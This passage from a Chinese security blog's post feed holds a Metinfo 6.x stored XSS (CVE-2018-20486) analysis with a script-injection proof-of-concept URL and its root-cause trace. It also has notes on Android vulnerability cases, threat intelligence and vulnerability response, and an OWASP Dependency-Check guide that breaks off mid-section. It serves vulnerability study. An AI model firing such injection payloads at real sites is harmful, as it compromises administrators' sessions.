<li class="lvl-2">
<p><a href="https://zhuanlan.zhihu.com/p/71672282">从SCTF看JWT安全 (附SCTF web writeup)</a></p>
</li>
<li class="lvl-2">
<p><a href="https://xz.aliyun.com/t/6776">攻击JWT的一些方法</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/">Attacking JWT authentication</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/ddonking/article/details/82492206">RSA的公钥和私钥区别</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>WebSecurity</category>
      </categories>
      <tags>
        <tag>WebSecurity</tag>
      </tags>
  </entry>
  <entry>
    <title>Metinfo 6.x存储型XSS(CVE-2018-20486) 漏洞分析</title>
    <url>/2019/1900.html</url>
    <content><![CDATA[<h1>安装漏洞环境:</h1>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6ea9ebae.jpg" alt="" /></p>
<h1>漏洞复现:</h1>
<p>poc:<code>[Host]/admin/login/login_check.php?url_array[]=&lt;script&gt;alert(1)&lt;/script&gt;&amp;url_array[]=a</code></p>
<p>管理员登录后台-安全与效率,触发xss</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6eb902ff.jpg" alt="" /></p>
<h1>漏洞分析:</h1>
<h2 id="粗略猜测">粗略猜测:</h2>
<p>引入了外部变量,直接修改了数据库该值<br />
<img src="https://i.loli.net/2019/04/25/5cc1d6ec922f7.jpg" alt="" /></p>
<p><code>/MetInfo6.1.3/app/system/safe/admin/index.class.php</code></p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6ed68069.jpg" alt="" /></p>
<p>查询数据库发现被是加密后的字段:</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6ee20e9c.jpg" alt="" /></p>
<p>解密后应该就是<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<hr />
<h2 id="跟踪分析">跟踪分析:</h2>
<h3 id="common-inc-php">common.inc.php</h3>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6ef6f74c.jpg" alt="" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foreach(array(&#x27;_COOKIE&#x27;, &#x27;_POST&#x27;, &#x27;_GET&#x27;) as $_request) &#123;</span><br><span class="line">	foreach($$_request as $_key =&gt; $_value) &#123;</span><br><span class="line">		$_key&#123;0&#125; != &#x27;_&#x27; &amp;&amp; $$_key = daddslashes($_value,0,0,1);</span><br><span class="line">		$_M[&#x27;form&#x27;][$_key]=daddslashes($_value,0,0,1);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个时候,引入了外部变量<code>_COOKIE</code>,<code>_POST</code>, <code>_GET</code></p>
<p>这个循环会遍历全局变量<code>_COOKIE</code>,<code>_POST</code>, <code>_GET</code>，然后对里面的值进行过滤,然后赋值到<code>$_M[form]</code></p>
<p>进入循环之前,<code>$_M</code>变量的值为</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6f01e788.jpg" alt="" /></p>
<p>结束循环时,出现了变量覆盖,<code>$_M</code>变量的值为</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6f0e6c11.jpg" alt="" /></p>
<blockquote>
<p>code mix with data.</p>
</blockquote>
<h3 id="login-check-php">login_check.php</h3>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6f2717ec.jpg" alt="" /></p>
<p>payload经过<code>authcode</code>函数加密后.更新入了表<code>met_config</code>里的<code>met_adminfile</code>字段</p>
<hr />
<p>攻击者将payload注入到数据库后,管理员访问后台的安全与效率,触发xss时发生了什么?</p>
<h3 id=""></h3>
<p><code>load_class.php</code> 加载模块</p>
<p>加载了<code>app/system/index/admin/</code>下的<code>index</code> 类,调用里面的<code>doindex</code>函数</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6f434e32.jpg" alt="" /></p>
<p><code>index</code> 类继承了 <code>admin</code>类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> <span class="keyword">extends</span> <span class="title">admin</span></span></span><br></pre></td></tr></table></figure>
<p><code>admin</code> 类继承了 <code>common</code>类</p>
<h3 id="common-class-php">common.class.php</h3>
<p><code>common</code>类 构造函数里面,加载了全站的配置数据</p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0ehqbi24wj30u00iatgb.jpg" alt="" /></p>
<p>load_config_global函数,先读取了数据库的配置到<code>$M</code>全局数组中,</p>
<p>此时的<code>met_adminfile</code>还没解密<br />
<img src="https://ws2.sinaimg.cn/large/006tKfTcgy1g0ehy76stbj31aq0f87dx.jpg" alt="" /></p>
<p>经过<code>authcode</code>解密函数后,<br />
<img src="https://ws1.sinaimg.cn/large/006tKfTcgy1g0ehzt6b3ij323s09kk3c.jpg" alt="" /></p>
<p>可以看到<code>met_adminfile</code>就是我们的payload<br />
<img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0ei0nueppj30nc0ee7ah.jpg" alt="" /></p>
<h3 id="admin-class-php">admin.class.php</h3>
<p>执行<code>check()</code>函数:</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1g0ei492hgej31iu0geqd7.jpg" alt="" /></p>
<p>将$M全局数组里的值赋给了<code>$met_adminfile</code></p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1g0ei5dwdf4j32580e04mv.jpg" alt="" /></p>
<h3 id="加载页面">加载页面:</h3>
<p>先加载渲染了侧边栏、头部底部之后,最后才加载渲染<code>/app/system/safe/admin/index.class.php</code></p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1g0eiv8ks2vj328p0u0e81.jpg" alt="" /></p>
<hr />
<h2 id="流程">流程:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>login_check.php</code> 10行 包含了<code>../include/common.inc.php</code></p>
</li>
</ul>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0egz5zgcwj30h600qaah.jpg" alt="" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>common.inc.php</code> 79-84行,循环赋值给<code>$M</code>数组时产生了变量覆盖</p>
</li>
</ul>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1g0egzvve8tj3102068791.jpg" alt="" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>login_check.php</code> 13-18行,将payload加密后更新入了表<code>met_config</code>里的<code>met_adminfile</code>字段</p>
</li>
</ul>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1g0eh167azuj327e05w124.jpg" alt="" /></p>
<hr />
<h1>others:</h1>
<p>造成变量覆盖时使用的语法.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$hell</span>=<span class="string">&quot;abc&quot;</span>; <span class="variable">$$hell</span>=<span class="string">&quot;def&quot;</span>;等同于<span class="variable">$abc</span>=<span class="string">&quot;def&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_request</span> = _GET</span><br><span class="line"><span class="variable">$$_request</span> = <span class="variable">$_GET</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>这是个trick?</p>
</blockquote>
<hr />
<h1>思考:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>善用搜索,加对断点可以加快跟踪调试的速度</p>
</li>
<li class="lvl-2">
<p>一开始粗略猜测,可以知道大体的思路</p>
</li>
<li class="lvl-2">
<p>对前端页面进行元素查看,也可以方便加断点,加快速度</p>
</li>
</ul>
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://blog.csdn.net/dl425134845/article/details/49616557">php下session_cache_limiter(private,must-revalidate)–表单填写内容不丢失</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.anquanke.com/post/id/169456">Metinfo 6.x存储型XSS分析（CVE-2018-20486）</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>VulnAnalysis</category>
      </categories>
      <tags>
        <tag>VulnAnalysis</tag>
      </tags>
  </entry>
  <entry>
    <title>Notes-Wooyun安卓漏洞库</title>
    <url>/2020/65272.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>对安卓的app漏洞不太熟悉,所以看看一些漏洞类型，做些笔记</p>
<hr />
<h1>案例:</h1>
<h2 id="客户端">客户端:</h2>
<h3 id="设计缺陷-逻辑错误">设计缺陷/逻辑错误:</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0190106.html">金山词霸安卓app越权问题（signature算法太弱轻松破解）</a></p>
<p>登录后每一个数据包都带signature字段，没有cookie和session认证，那么破解signature后就能自己组包生成signature了，以达到越权的目的。</p>
<blockquote>
<p>前段时间也遇到过,app对每个数据包做签名,导致无法进行篡改.</p>
</blockquote>
</li>
<li class="lvl-2">
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0132255.html">聚美优品安卓客户端组件暴露可实现钓鱼</a></p>
</li>
<li class="lvl-2">
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0135403.html">去哪儿安卓客户端组件暴露可实现钓鱼</a></p>
<p>由于组件暴露问题，第三方应用可以启动应用这2个应该是看manifest文件<br />
TODOTODO</p>
</li>
</ul>
<hr />
<h3 id="非授权访问-认证绕过">非授权访问/认证绕过:</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-0148550.html">91金融安卓APP客户端升级过程存在缺陷可被中间人攻击利用植入木马</a></p>
<p>拦截回包,修改更新包的地址升级过程存在缺陷，，校验过程不严格，可被中间人攻击利用植入木马</p>
</li>
</ul>
<hr />
<h3 id="远程代码执行">远程代码执行</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0188311.html">巴士管家安卓app远程代码执行</a></p>
</li>
<li class="lvl-2">
<p>[]</p>
<p>TODOTODO</p>
</li>
</ul>
<hr />
<h2 id="服务端">服务端:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2016-0172231.html">漫画岛安卓app服务器SQL注入</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>AndroidSecurity</category>
      </categories>
      <tags>
        <tag>AndroidSecurity</tag>
      </tags>
  </entry>
  <entry>
    <title>Notes-安全应急响应中心之威胁情报探索—JSRC-2</title>
    <url>/2020/46109.html</url>
    <content><![CDATA[<h2 id="威胁情报和漏洞的区别">威胁情报和漏洞的区别:</h2>
<p>漏洞的概念较明确，而情报比较宽泛。</p>
<p>威胁情报并不是虚的。 其中存在假情报和难追溯的情报。</p>
<p><strong>情报一般分为线索和事件:</strong></p>
<p>我上报了一个黑客组织，可以作为<strong>线索</strong>；</p>
<p>公司根据这个线索发现了之前一个案子和他们有关，就可能引申出一个<strong>事件</strong>。</p>
<p>威胁情报并不一定是提前预知</p>
<p>作为甲方公司，很多已经发生的漏洞利用资金损失，我们也有很多没有发现的，这些也都是情报。</p>
<p><strong>情报分技术型情报和业务型情报</strong></p>
<p>漏洞属于技术型情报。有的情报很全，有的只能算是线索。</p>
<p>业务型的最难判定，我们这边也分两个维度，<strong>危害维度</strong>和<strong>完整度维度</strong>。</p>
<hr />
<h2 id="获取情报的来源渠道">获取情报的来源渠道:</h2>
<p>这个看业务了。</p>
<p>举个栗子，有的白帽子已经成功混迹在高端游戏玩家群里，黑产卖异常装备的时候，就来举报。</p>
<p>比较聪明的同学，会<strong>关注黑产变现的渠道</strong>。</p>
<blockquote>
<p>whole chain</p>
</blockquote>
<hr />
<h2 id="暂时没用的线索">暂时没用的线索:</h2>
<p>如果一条线索过来了，只是证明存在但不能做什么事。这种对于平台来说是不是一种成本浪费？</p>
<p><strong>溯源是一种能力，线索是一种沉淀。</strong></p>
<p>被证明有价值的情报，是一种线索沉淀，不会是浪费的。</p>
<p>安全行业内，不管是漏洞还是情报，都是要不断求证的。</p>
<p>只要<strong>投入产出比可控</strong>即可。</p>
<p>这其实也是一个二八原则。</p>
<p>此外，没有产生价值的，可能只是当前没有产生价值，后面业务变化了，可能就会产生相应价值。</p>
<hr />
<h2 id="建立威胁情报的目的">建立威胁情报的目的:</h2>
<p>无疑是<strong>为了预知未来的风险</strong>！</p>
<p>个人认为，威胁情报对于各公司来说可以把<strong>风险感知再次往前提</strong>，能够通过各渠道来源，分析后续的破坏行为。</p>
<hr />
<h2 id="威胁情报的评定指标">威胁情报的评定指标:</h2>
<p>主要看<strong>情报的详细程度和对业务的影响</strong>，来评定情报的等级。</p>
<p>不过低价值的情报分值不高。大致是看详细程度、涉及业务、目前和潜在的影响.</p>
<p>有一条就是基于漏洞的情报，不会比按漏洞标准评定低就是了。</p>
<p>目前来看提交者比较理性，大都是遇到事件了来提交，线索其实没那么多。</p>
<p>不同公司关注的情报不一样，建议大家在看情报的时候，先看看这个公司关注什么，根据公司实际业务多磨合磨合。</p>
<hr />
<h2 id="总结-3">总结:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>情报一般分为线索和事件:</p>
<ul class="lvl-2">
<li class="lvl-6">我上报了一个黑客组织，可以作为<strong>线索</strong>；</li>
<li class="lvl-6">公司根据这个线索发现了之前一个案子和他们有关，就可能引申出一个<strong>事件</strong>。</li>
</ul>
</li>
<li class="lvl-2">
<p>对于暂时没用的线索:</p>
<ul class="lvl-2">
<li class="lvl-6"><strong>溯源是一种能力，线索是一种沉淀。</strong></li>
<li class="lvl-6">被证明有价值的情报，是一种线索沉淀，不会是浪费的。</li>
<li class="lvl-6">安全行业内，不管是漏洞还是情报，都是要不断求证的。只要<strong>投入产出比可控</strong>即可。</li>
</ul>
</li>
<li class="lvl-2">
<p>威胁情报的评定指标:</p>
<ul class="lvl-2">
<li class="lvl-6">主要看<strong>情报的详细程度和对业务的影响</strong>，来评定情报的等级。</li>
</ul>
</li>
<li class="lvl-2">
<p>获取情报的来源渠道:</p>
<ul class="lvl-2">
<li class="lvl-6">可重点关注<strong>黑产变现的渠道</strong></li>
</ul>
</li>
<li class="lvl-2">
<p>建立威胁情报的目的:</p>
<ul class="lvl-2">
<li class="lvl-6">预知未来的风险</li>
<li class="lvl-6">风险感知再次往前提</li>
</ul>
</li>
</ul>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/xiangpasama/JDSRC-Small-Classroom/blob/master/02-%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%AD%E5%BF%83%E4%B9%8B%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E6%8E%A2%E7%B4%A2.pdf">安全应急响应中心之威胁情报探索</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Notes-止损</title>
    <url>/2022/51988.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="5a0e2b079ea1192224f7f82329c5cbe4630fcda7d3715baf46e7b2b97435bf69"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Notes-论安全漏洞响应机制扩展—JSRC-3</title>
    <url>/2020/20063.html</url>
    <content><![CDATA[<h2 id="如何看待待企业的安全工作建设">如何看待待企业的安全工作建设</h2>
<p>安全响应中心不仅仅是接报漏洞，还需要帮助内部提升安全质量，分为两方面：被动、主动。</p>
<p>被动方面:</p>
<p>比如说进行针对性的培训，加强规范。 <strong>需要明确的是，安全团队是在帮助业务部门防范风险；</strong></p>
<p>主动方面:</p>
<p>应该是我们增加的那些检测机制，例如在上线流程，或waf中增加策略，可以直接进行自动化检测。</p>
<p>漏洞的处理是一个方面，对于内部的项目上线筛查可能比后续更重要，通过需求评审， 架构评审，安全评审等来筛选项目是否够上线的条件。</p>
<p>上线前充分筛查，上线后出现问题，基本都可控。</p>
<blockquote>
<p>现状是,还会发现一些在野资产。都不知道什么时候就上线了。</p>
</blockquote>
<p>另外，上线流程过程中可以开发一些黑盒、白盒扫描工具，提供给开发人员，让开发人员去自查，如果有问题再找安全部门，这样开发人员也会对安全越来越了解。只要解决开发部门的自我驱动，所有问题都迎刃而解。</p>
<blockquote>
<p>让开发人员自查,这个难度有点大</p>
</blockquote>
<hr />
<h2 id="安全响应机制整个流程的结束点？">安全响应机制整个流程的结束点？</h2>
<p>白帽子提交漏洞，<strong>企业应该按照白帽子提供的方法结合自己的业务去查是否还有类似的问题，白帽子的漏洞提交只是事件处理的开始。处理完相同类型的漏洞，才能算是结束。</strong></p>
<blockquote>
<p>举一反三, 一个地方有问题，那么其他地方出现同样问题的概率很大。</p>
</blockquote>
<hr />
<h2 id="跨部门协作配合修复漏洞的问题">跨部门协作配合修复漏洞的问题:</h2>
<p>有些漏洞不一定能及时修复,但这不会影响我们对漏洞的评级。</p>
<p>在企业中，越大的企业越会出现漏洞修复推进困难的情况。</p>
<blockquote>
<p>漏洞的修复情况,看这几个因素:</p>
<ol>
<li class="lvl-3">具体的漏洞</li>
<li class="lvl-3">这个漏洞会影响的业务</li>
<li class="lvl-3">业务方的配合程度</li>
<li class="lvl-3">有没有合适贴切的解决方案</li>
</ol>
</blockquote>
<p>“提升安全能力”不在应急止损的关注范围内，可以包括在后续安全建设中。 跨部门修复方面主要分 <strong>“产品线重视自觉寻求帮助”</strong> 和 <strong>“上级推动”</strong> 两类。</p>
<p>定制漏洞修复事件dead line，如果不修，逐级上报。</p>
<p>还可制定不同级别漏洞对应不同修复时间的要求， 严格执行考核。 超期系统自动邮件抄处理人的上一级领导， 时间越长，抄送级别越高，直到超送到技术副总裁。</p>
<hr />
<h2 id="一个业务部门如果多次出现同类型问题，-有相应的响应机制么？">一个业务部门如果多次出现同类型问题， 有相应的响应机制么？</h2>
<p>需要看是什么类型问题，是工作态度问题还是技术能力不够，如果是前者要找他们leader去沟通，如果是后者，安全部门需要组织交流培训，提升业务部门的安全意识和技术能力。</p>
<hr />
<h2 id="安全应急响应机制">安全应急响应机制:</h2>
<p>建立安全接口人，协助产品线培养免疫力。</p>
<p>阶梯性的做安全培训，后续让产品线他们自己重视培训，提升安全意识与能力。</p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/xiangpasama/JDSRC-Small-Classroom/blob/master/03-%E8%AE%BA%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%93%8D%E5%BA%94%E6%9C%BA%E5%88%B6%E6%89%A9%E5%B1%95.pdf">论安全漏洞响应机制扩展</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>OWASP-Dependency-Check的使用与结果解析</title>
    <url>/2020/19075.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>SDL中使用到<code>Dependency-Check</code>工具对源代码的第三方依赖库进行扫描。</p>
<hr />
<h1>简介:</h1>
<p>OWASP是开源的、非盈利的全球性安全组织，致力于应用软件的安全研究。OWASP的使命是使应用软件更加安全，使企业和组织能够对应用安全风险作出更清晰的决策。</p>
<p>OWASP的研究成果被美、欧、日等多个国家的32个政府与行业组织机构引用成为近百项国际法规、标准、指南和行业行为准则。</p>
<p>Dependency-Check是OWASP（Open Web Application Security Project）的一个实用开源程序，用于识别项目依赖项并检查是否存在任何已知的，公开披露的漏洞。</p>
<p>目前，已支持<code>Java</code>、<code>.NET</code>、<code>Ruby</code>、<code>PHP</code>、<code>Node.js</code>、<code>Python</code>等语言编写的程序，并为<code>C/C++</code>构建系统（autoconf和cmake）提供了有限的支持。而且该工具还是OWASP Top 10的解决方案的一部分。</p>
<p>Dependency-Check支持面广（支持多种语言）、可集成性强，作为一款开源工具，在多年来的发展中已经支持和许多主流的软件进行集成，比如：命令行、Ant、Maven、Gradle、Jenkins、Sonar等；具备使用方便，落地简单等优势。</p>
<hr />
<h1>实现原理:</h1>
<p>依赖性检查可用于扫描应用程序（及其依赖库），执行检查时会将 <code>Common Platform Enumeration (CPE)</code>美国国家漏洞数据库及<code>NPM Public Advisories</code>库下载到本地，再通过核心引擎中的一系列分析器检查项目依赖性，收集有关依赖项的信息，然后根据收集的依赖项信息与本地的CPE&amp;NPM库数据进行对比，如果检查发现扫描的组件存在已知的易受攻击的漏洞则标识，最后生成报告进行展示。</p>
<hr />
<h1>命令参数:</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.\dependency-check.bat --<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">usage: Dependency-Check Core [--advancedHelp] [--enableExperimental]</span><br><span class="line">       [--exclude &lt;pattern&gt;] [-f &lt;format&gt;] [--failOnCVSS &lt;score&gt;] [-h]</span><br><span class="line">       [--junitFailOnCVSS &lt;score&gt;] [-l &lt;file&gt;] [-n] [-o &lt;path&gt;]</span><br><span class="line">       [--prettyPrint] [--project &lt;name&gt;] [-s &lt;path&gt;] [--suppression</span><br><span class="line">       &lt;file&gt;] [-v]</span><br><span class="line"></span><br><span class="line">Dependency-Check Core can be used to identify <span class="keyword">if</span> there are any known CVE</span><br><span class="line">vulnerabilities <span class="keyword">in</span> libraries utilized by an application. Dependency-Check</span><br><span class="line">Core will automatically update required data from the Internet, such as</span><br><span class="line">the CVE and CPE data files from nvd.nist.gov.</span><br><span class="line"></span><br><span class="line">    --advancedHelp              Print the advanced <span class="built_in">help</span> message.</span><br><span class="line">    --enableExperimental        Enables the experimental analyzers.</span><br><span class="line">    --exclude &lt;pattern&gt;         Specify an exclusion pattern. This option</span><br><span class="line">                                can be specified multiple <span class="built_in">times</span> and it</span><br><span class="line">                                accepts Ant style exclusions.</span><br><span class="line"> -f,--format &lt;format&gt;           The report format (HTML, XML, CSV, JSON,</span><br><span class="line">                                JUNIT, or ALL). The default is HTML.</span><br><span class="line">                                Multiple format parameters can be</span><br><span class="line">                                specified.</span><br><span class="line">    --failOnCVSS &lt;score&gt;        Specifies <span class="keyword">if</span> the build should be failed <span class="keyword">if</span></span><br><span class="line">                                a CVSS score above a specified level is</span><br><span class="line">                                identified. The default is 11; since the</span><br><span class="line">                                CVSS scores are 0-10, by default the build</span><br><span class="line">                                will never fail.</span><br><span class="line"> -h,--<span class="built_in">help</span>                      Print this message.</span><br><span class="line">    --junitFailOnCVSS &lt;score&gt;   Specifies the CVSS score that is</span><br><span class="line">                                considered a failure when generating the</span><br><span class="line">                                junit report. The default is 0.</span><br><span class="line"> -l,--<span class="built_in">log</span> &lt;file&gt;                The file path to write verbose logging</span><br><span class="line">                                information.</span><br><span class="line"> -n,--noupdate                  Disables the automatic updating of the CPE</span><br><span class="line">                                data.</span><br><span class="line"> -o,--out &lt;path&gt;                The folder to write reports to. This</span><br><span class="line">                                defaults to the current directory. It is</span><br><span class="line">                                possible to <span class="built_in">set</span> this to a specific file</span><br><span class="line">                                name <span class="keyword">if</span> the format argument is not <span class="built_in">set</span> to</span><br><span class="line">                                ALL.</span><br><span class="line">    --prettyPrint               When specified the JSON and XML report</span><br><span class="line">                                formats will be pretty printed.</span><br><span class="line">    --project &lt;name&gt;            The name of the project being scanned.</span><br><span class="line"> -s,--scan &lt;path&gt;               The path to scan - this option can be</span><br><span class="line">                                specified multiple <span class="built_in">times</span>. Ant style paths</span><br><span class="line">                                are supported (e.g. <span class="string">&#x27;path/**/*.jar&#x27;</span>); <span class="keyword">if</span></span><br><span class="line">                                using Ant style paths it is highly</span><br><span class="line">                                recommended to quote the argument value.</span><br><span class="line">    --suppression &lt;file&gt;        The file path to the suppression XML file.</span><br><span class="line">                                This can be specified more <span class="keyword">then</span> once to</span><br><span class="line">                                utilize multiple suppression files</span><br><span class="line"> -v,--version                   Print the version information.</span><br></pre></td></tr></table></figure>
<p>我使用的扫描命令:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -n 是不开启自动更新</span></span><br><span class="line">sh /opt/devsecops/tools/dependency-check/bin/dependency-check.sh -f <span class="string">&#x27;JSON&#x27;</span> -n --project <span class="string">&#x27;dc_check&#x27;</span> --scan /opt/xxx/jar_lib --out /opt/xxx/dc.json</span><br></pre></td></tr></table></figure>
<p>使用的更新命令:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 仅更新</span></span><br><span class="line">sh /opt/devsecops/tools/dependency-check/bin/dependency-check.sh --updateonly</span><br></pre></td></tr></table></figure>
<hr />
<h1>结果解析:</h1>
<p>对dc的扫描结果json进行解析</p>
<h2 id="json整体结构">json整体结构:</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;reportSchema&quot;</span>: <span class="string">&quot;1.1&quot;</span>, <span class="comment"># 报告结构</span></span><br><span class="line">   <span class="string">&quot;scanInfo&quot;</span>: &#123;...&#125;, <span class="comment"># 扫描信息</span></span><br><span class="line">   <span class="string">&quot;projectInfo&quot;</span>: &#123;...&#125;, <span class="comment"># 项目信息</span></span><br><span class="line">   <span class="string">&quot;dependencies&quot;</span>: [...],<span class="comment"># 依赖信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最主要是依赖信息的那一项</p>
<hr />
<h1>报告结构、扫描信息、项目信息</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200821144233.png" alt="20200821144233" /></p>
<p>这里面没有什么重要的信息。可略过</p>
<hr />
<h1>依赖信息:</h1>
<p>整体结构:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">     <span class="string">&quot;isVirtual&quot;</span>: false,</span><br><span class="line">     <span class="string">&quot;fileName&quot;</span>: <span class="string">&quot;jackson-databind-2.9.0.pr4.jar&quot;</span>, <span class="comment"># 文件名</span></span><br><span class="line">     <span class="string">&quot;filePath&quot;</span>: <span class="string">&quot;\/opt\/devsecops\/logs\/ec-cart_V20200814024805\/jar_lib\/jackson-databind-2.9.0.pr4.jar&quot;</span>, <span class="comment"># 文件路径</span></span><br><span class="line">     <span class="string">&quot;md5&quot;</span>: <span class="string">&quot;a1a9284e812952d15736794ef252dfd9&quot;</span>, <span class="comment"># md5值</span></span><br><span class="line">     <span class="string">&quot;sha1&quot;</span>: <span class="string">&quot;e96baca7953374a502eb995d3901cad7580d3741&quot;</span>,</span><br><span class="line">     <span class="string">&quot;sha256&quot;</span>: <span class="string">&quot;b9f004b868004f84745ff844a9e0f05367cd5b8dc1a69944bebdec035ea00146&quot;</span>,</span><br><span class="line">     <span class="string">&quot;description&quot;</span>: <span class="string">&quot;General data-binding functionality for Jackson: works on core streaming API&quot;</span>, <span class="comment"># 该jar包的作用描述</span></span><br><span class="line">     <span class="string">&quot;license&quot;</span>: <span class="string">&quot;http:\/\/www.apache.org\/licenses\/LICENSE-2.0.txt&quot;</span>,</span><br><span class="line">     <span class="string">&quot;evidenceCollected&quot;</span>: &#123;...&#125;,<span class="comment"># 依据信息</span></span><br><span class="line">     <span class="string">&quot;packages&quot;</span>: [...], <span class="comment"># </span></span><br><span class="line">     <span class="string">&quot;vulnerabilityIds&quot;</span>: [...], <span class="comment"># cpe表达式</span></span><br><span class="line">      <span class="string">&quot;vulnerabilities&quot;</span>: [...],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="evidenceCollected依据信息">evidenceCollected依据信息:</h2>
<p>结构:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200819221938.png" alt="20200819221938" /></p>
<p>详细内容:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200819221957.png" alt="20200819221957" /></p>
<p>从各种来源来判断这个组件的<code>vendor</code>(供应商)、<code>Product</code>(产品名)、<code>Version</code>(版本号)</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200821104327.png" alt="20200821104327" /></p>
<hr />
<h2 id="packages-vulnerabilityIds">packages&amp;vulnerabilityIds:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200821110733.png" alt="20200821110733" /></p>
<p>这两项主要是通过<code>pkg</code>、<code>cpe表达式</code>识别标识的信息</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200821142630.png" alt="20200821142630" /></p>
<p>其中<code>vulnerabilityIds</code>-&gt;<code>confidence</code>里的是这个风险的可信度</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200821143026.png" alt="20200821143026" /></p>
<p>为了减少误报,我们一般选择<code>HIGHEST</code>和<code>HIGH</code>的可信度的风险信息。</p>
<hr />
<h2 id="vulnerabilities漏洞信息：">vulnerabilities漏洞信息：</h2>
<p>vulnerabilities是一个漏洞列表，里面包含了某组件当前版本涉及到的所有cve</p>
<p>以<code>jackson-databind-2.9.0.pr4.jar</code>为例,它的内容如下</p>
